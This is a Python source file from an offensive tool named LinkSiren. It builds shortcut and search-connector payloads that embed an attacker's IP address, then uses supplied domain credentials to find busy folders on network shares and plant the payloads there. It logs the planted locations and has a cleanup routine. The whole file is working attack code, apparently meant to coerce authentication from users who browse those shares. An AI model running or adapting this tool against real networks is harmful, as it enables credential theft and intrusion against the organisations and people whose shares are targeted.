import json
from datetime import datetime
from pathlib import Path
from linksiren.impure_functions import read_targets, get_sorted_rankings, write_payload_local, write_list_to_file, get_lnk_template
from linksiren.pure_functions import filter_targets, is_valid_payload_name, create_lnk_payload, compute_threshold_date

def handle_generate(args):
    available_extensions = ['.searchConnector-ms', '.library-ms', '.url', '.lnk']
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f'template{payload_extension}'

    if payload_extension == '.lnk':
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
    else:
        with open(template_path, 'r', encoding="utf-8") as template_file:
            payload_contents = template_file.read()
            payload_contents = payload_contents.format(attacker_ip=args.attacker)

    write_payload_local(args.payload, payload_contents)

def handle_rank(args, domain, username, password):
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(targets, domain, username, password, threshold_date, args.max_depth, args.fast)

    with open('folder_rankings.txt', mode='w', encoding="utf-8") as f:
        f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))

def handle_identify(args, domain, username, password):
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(targets=targets, domain=domain, username=username, password=password,
                            active_threshold_date=threshold_date, max_depth=args.max_depth, go_fast=args.fast)
    filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
    write_list_to_file(filtered_targets, 'folder_targets.txt')

def handle_deploy(args, domain, username, password):
    targets = read_targets(args.targets)
    payloads_written = []
    available_extensions = ['.searchConnector-ms', '.library-ms', '.url', '.lnk']
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f'template{payload_extension}'

    if payload_extension == '.lnk':
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
    else:
        with open(template_path, 'r', encoding="utf-8") as template_file:
            template_contents = template_file.read()
            payload_contents = template_contents.format(attacker_ip=args.attacker)

    for target in targets:
        target.connect(user=username, password=password, domain=domain)
        for path in target.paths:
            write_successful = target.write_payload(path=path, payload_name=args.payload, payload=payload_contents)
            if write_successful is True:
                payloads_written.append(f'\\\\{target.host}\\{path}')

    write_list_to_file(payloads_written, 'payloads_written.txt', 'a')

def handle_cleanup(args, domain, username, password):
    targets = read_targets(args.targets)
    for target in targets:
        target.connect(user=username, password=password, domain=domain)
        for path in target.paths:
            target.delete_payload(path, args.payload)